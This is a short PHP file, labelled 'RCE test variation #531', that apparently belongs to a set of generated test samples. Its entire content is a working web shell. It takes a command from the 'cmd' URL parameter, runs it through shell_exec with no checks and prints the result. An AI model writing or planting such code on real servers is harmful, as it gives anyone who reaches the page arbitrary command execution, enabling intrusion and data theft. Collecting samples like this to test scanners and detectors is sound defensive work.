<?php
// RCE test variation #531
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>